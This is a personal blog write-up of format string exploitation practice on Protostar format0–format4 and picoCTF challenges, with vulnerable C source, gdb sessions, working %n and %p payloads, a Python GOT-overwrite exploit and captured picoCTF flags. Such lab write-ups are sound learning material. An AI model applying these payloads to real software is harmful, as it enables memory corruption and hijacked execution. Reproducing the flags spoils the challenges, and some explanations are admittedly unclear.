---
title: My Format_string practice
published: 2025-11-27
description: ''
image: 'guide/fsbackground.jpg'
tags: [write_up,learning,assembly,binary_exploitation]
category: 'learning'
draft: false 
lang: 'en'
---

Hey ! Nice to see you here this is my format string practice. 

Here i got you something. Look at this 

- [Format Specifiers in C - GeeksforGeeks](https://www.geeksforgeeks.org/c/format-specifiers-in-c/)
- [format-strings.pdf](https://lettieri.iet.unipi.it/hacking/format-strings.pdf)
- [Format Zero :: Andrew Griffiths' Exploit Education](https://exploit.education/protostar/format-zero/)
- And my currently fav youtuber : [EVE Online - Official Gameplay Trailer - Play Free!](https://www.youtube.com/watch?v=t1LH9D5cuK4&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=24)
:3 Ok lets gooooo!!!

# useful setups for  `dbg`

```
(gdb) set disassembly-flavor intel

; setting for better illustrate
define hook-stop
info registers
x/24wx $esp
x/2i
end
```

# ./format0

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

In this lab, source code tell us the value of `target`must be equal with 0xdeadbeef so i gonna bufferoverlow with the value at the end like this `'\xef\xbe\xad\xde'` . You can see it is in `little-endian`

```asm
./format0 "$(python -c "print  'A' *64 +  '\xef\xbe\xad\xde'  ")"

0xbffffc00:     0xb7fffa54      0x00000000      0xb7fe1b28      0x41414141
0xbffffc10:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc20:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc30:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffc40:     0x41414141      0x41414141      0x41414141      0xdeadbeef

```

But this is format string lab 😂 i have to use sth else with format string.

```python
./format0 $(python -c "print '%64d' + '\xef\xbe\xad\xde'") 
 0xbffffc30:     0xbffffc4c      0xbffffe8f      0x080481e8      0xbffffcc8
0xbffffc40:     0xb7fffa54      0x00000000      0xb7fe1b28      0x20202020
0xbffffc50:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffffc60:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffffc70:     0x20202020      0x20202020      0x20202020      0x20202020
0xbffffc80:     0x31202020      0x31353433      0x38323133      0xdeadbeef
0xbffffc90:     add    %al,0x7ff4b7fd(%ebx)
0xbffffc96:     std
```

Still same as the one above but with %64d which means it reads value with width 64 characters :V

Well i know it doesnt clear much 🙂 and me tooo maybe i will understand it more in the future.

Anyway from now on, I only show how i solve the labs and no explain :V It takes too much time. 

# ./format1

```asm
objdump -t format1

08049638 g     O .bss   00000004              target

'bbbbb'
./format1 "`python -c "print 'bbbb'+ '\x38\x96\x04\x08'  + '%X ' * 126 + '%n '"`"

./format1 "$(python -c "print 'bbbb'+ '\x38\x96\x04\x08'  + '%X ' * 126 + '%n '")"

'%n'
```

# Format string 0

this lab is quite simple. You just choose the option that contain format string  

![image.png](fs1.png)

```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?

Here comes the first customer Patrick who wants a giant bite.

Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe

Enter your recommendation:  Gr%114d_Cheese

Gr4202954_Cheese

Good job! Patrick is happy! Now can you serve the second customer?

Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)

Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak

Enter your recommendation: Cla%sic_Che%s%steak

ClaCla%sic_Che%s%steakic_Che

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_a1d85b3e}

```

# Format string 1

![image.png](fs2.png)

Alright let check this lab, i think i can do it after done first two format_string lab 

**Is this a 32-bit or 64-bit binary?** 

Answer for this is 64bit cause Normally

### 64bit go with 0x..40

```asm
gef➤  disassemble main
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   rbp
   0x00000000004011fb <+5>:     mov    rbp,rsp
   0x00000000004011fe <+8>:     sub    rsp,0x4d0
   0x0000000000401205 <+15>:    mov    esi,0x402008
   0x000000000040120a <+20>:    mov    edi,0x40200a

```

### 32bit go with 0x..80

```asm
(gdb) disassemble main
Dump of assembler code for function main:
0x0804841c <main+0>:    push   %ebp
0x0804841d <main+1>:    mov    %esp,%ebp
0x0804841f <main+3>:    and    $0xfffffff0,%esp
0x08048422 <main+6>:    sub    $0x10,%esp
0x08048425 <main+9>:    mov    0xc(%ebp),%eax
0x08048428 <main+12>:   add    $0x4,%eax
0x0804842b <main+15>:   mov    (%eax),%eax
0x0804842d <main+17>:   mov    %eax,(%esp)
0x08048430 <main+20>:   call   0x80483f4 <vuln>
0x08048435 <main+25>:   leave
0x08048436 <main+26>:   ret
End of assembler dump.

```

You can get know more about this in: [`Reverse engineering C programs (64bit vs 32bit) - bin 0x10`](https://www.youtube.com/watch?v=vXWHmucgZW0&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=18) 

i tried with different format string but when with %d it show special things

```asm
( python -c "print ',%d'*30  + ',aaaaa'") | nc mimas.picoctf.net 58066
```

alright let me explain this thing. Im using `%d`
In geeksforgeeks, it said 

| **%d** | For signed integer type. |
| --- | --- |

```asm
$(python -c "print '(%d)'*30  + ',aaaaa'") | nc mimas.picoctf.net 64012
Give me your order and I'll read it back to you:
Here's your order: ,4202776,0,-1334609408,0,31967360,171210804,1666401344,-1336766880,-1334520624,1,1666401552,0,0,1868786032,1831956020,858880311,875652703,1664497971,7,-1334511400,7,1949332048,1819898963,9,-1334440471,-1336733544,-1334520624,0,1666401568,744760620,aaaaa

```

These are ( `ocipm1n441f_c693` )what i got when try to convert INT to ASCII. Well not enough to be a flag.

Now im using %p 

```asm
( python -c "print '(%p)'*30  + ',aaaaa'") | nc mimas.picoctf.net 64012
```

```asm
$ ( python -c "print '(%p)'*30  + ',aaaaa'") | nc mimas.picoctf.net 64012

```

Give me your order and I'll read it back to you:

```asm
Here's your order: (0x402118)((nil))(0x7838bae5da00)((nil))(0x10e7880)(0xa347834)(0x7fff74823a10)(0x7838bac4ee60)(0x7838bae734d0)(0x1)(0x7fff74823ae0)((nil))((nil))(0x7b4654436f636970)(0x355f31346d316e34)(0x3478345f33317937)(0x30355f673431665f)(0x7d343663363933)(0x7)(0x7838bae758d8)(0x2300000007)(0x206e693374307250)(0xa336c797453)(0x9)(0x7838bae86de9)(0x7838bac57098)(0x7838bae734d0)((nil))(0x7fff74823af0)(0x2970252829702528),aaaaa
```

(0x7b4654436f636970)(0x355f31346d316e34)(0x3478345f33317937)(0x30355f673431665f)(0x7d343663363933)

Okay take a look at this range i remove all bracket and `0x`

```asm
0x7b4654436f636970355f31346d316e343478345f3331793730355f673431665f7d343663363933
```

Convert it from hex to ascii and here we go `{FTCocip5_14m1n44x4_31y705_g41f_}46c693` it is our flag but it is in little endian so i convert it to big endian. I asked chatgpt to provide me this :V

```asm
from pwn import *
a = [
    0x7b4654436f636970,
    0x355f31346d316e34,
    0x3478345f33317937,
    0x30355f673431665f,
    0x7d343663363933
]
flaghex = ''
for i in a:
    le_hex = f"{i:0x}"             
    if len(le_hex) % 2:             
        le_hex = "0" + le_hex
    b = bytes.fromhex(le_hex)
    be_hex = b[::-1].hex()
    flaghex+=be_hex

flag=bytes.fromhex(flaghex)
print(flag.decode()) 
```

Flag: `picoCTF{4n1m41_57y13_4x4_f14g_50396c64}`

# ./format2

You need to `objdump -t`  to find the address of target :V

080496e4 g     O .bss   00000004              target

0x0804848f <vuln+59>:   cmp    eax,0x40

```asm
(python -c 'print "\xe4\x96\x04\x08" + "%60x" + "%4$n"' ; cat )| ./format2

(python -c 'print  "%d%d"  ; cat- )| ./format2

```

```asm
(python -c 'print  "%20d"+"aaaa"+"\xe4\x96\x04\x08"+ "%X "*4 +"%n " '  )| ./format2
(python -c 'print  "aaaa"+"\xe4\x96\x04\x08"+ "%13x "*4 +"%n " '  )| ./format2
```

`"%20d"` : help you easily choose the correctly number of character when `%n` print out

`%n` : print out the number of characters that print on the screen

%1x = 4 characters

%1d = 1 character

# ./format3

080496f4 g     O .bss   00000004              target

```asm
(python -c 'print  "%19993d"+"aaaaa"+"\xf4\x96\x04\x08"+ "%1300777x "* 13 +"%n " '  )| ./format3
```

![image.png](fs3.png)

well it print alot

# ./format4

First examine the hello func

```asm
(gdb) x hello
0x80484b4 <hello>:      0x83e58955
```

### Find `global offset table`

GOT is the place we want to write this hello address to

```asm
(gdb) disassemble vuln
```

Dump of assembler code for function vuln:
0x080484d2 <vuln+0>:    push   ebp
0x080484d3 <vuln+1>:    mov    ebp,esp
0x080484d5 <vuln+3>:    sub    esp,0x218
0x080484db <vuln+9>:    mov    eax,ds:0x8049730
0x080484e0 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x080484e4 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x080484ec <vuln+26>:   lea    eax,[ebp-0x208]
0x080484f2 <vuln+32>:   mov    DWORD PTR [esp],eax
0x080484f5 <vuln+35>:   call   0x804839c [fgets@plt](mailto:fgets@plt)
0x080484fa <vuln+40>:   lea    eax,[ebp-0x208]
0x08048500 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048503 <vuln+49>:   call   0x80483cc [printf@plt](mailto:printf@plt)
0x08048508 <vuln+54>:   mov    DWORD PTR [esp],0x1
0x0804850f <vuln+61>:   call   `0x80483ec` [exit@plt](mailto:exit@plt)
End of assembler dump.

```asm
(gdb) disassemble 0x80483ec
```

Dump of assembler code for function exit@plt:

0x080483ec <exit@plt+0>:        jmp    *`0x8049724`
0x080483f2 <exit@plt+6>:        push   $0x30
0x080483f7 <exit@plt+11>:       jmp    0x804837c
End of assembler dump.

```asm
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080483f2
```

Run format4 with two breakpoints

```asm
(gdb) info break
Num     Type           Disp Enb Address    What
1      breakpoint     keep y   0x08048503 in vuln at format4/format4.c:20
       breakpoint already hit 1 time
2      breakpoint     keep y   0x0804850f in vuln at format4/format4.c:22
```

Set up the value of jmp return in plt to hello function

```asm
(gdb) r
Starting program: /opt/protostar/bin/format4
hello ; input

Breakpoint 1, 0x08048503 in vuln () at format4/format4.c:20
20      format4/format4.c: No such file or directory.
        in format4/format4.c
(gdb) set {int}0x8049724=0x80484b4
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080484b4

```

Keep going til the end

```asm
Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22
22      in format4/format4.c
(gdb) c
Continuing.
code execution redirected! you win

```

So that just only test on local

## `%4$x`

This `dollar`sign is point to the `4th` parameter of `printf` instead of going through each one

### With `%x`

```python
user@protostar:/tmp$ cat testf4
AAAABBBBCCCC%x %x %x %x XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

```asm
(gdb) r < /tmp/testf4

(gdb) c
Continuing.
AAAABBBBCCCC200 b7fd8420 bffff5f4 41414141 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
Program exited with code 01.

```

### With `%4$x`

```
user@protostar:/tmp$ cat testf4
AAAABBBBCCCC%4$x %4$x %4$x %4$x XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

```
(gdb) r < /tmp/testf4

(gdb) c
Continuing.
AAAABBBBCCCC41414141 41414141 41414141 41414141 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

![image.png](fs4.png)

this is a picture from [`LiveOverflow - YouTube`](https://www.youtube.com/@LiveOverflow)

### Python code : Calculating exact the number of characters

```python
import struct

HELLO = 0x80484b4
exit_plt=0x8049724

def pad(s):
    return s+"X"*(512-len(s))
exploit =""
exploit +=struct.pack("I", exit_plt)

exploit += "%134513825dAAAABBBBCCCC"
exploit+="%4$n "*4

print pad(exploit)
```

```asm
Breakpoint 2, 0x0804850f in vuln () at format4/format4.c:22
22      in format4/format4.c
(gdb) x 0x8049724
0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:   0x080484b4
(gdb) c
Continuing.
                                                                                                                                                                  512AAAABBBBCCCC    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXcode execution redirected! you win

Program exited with code 01.

```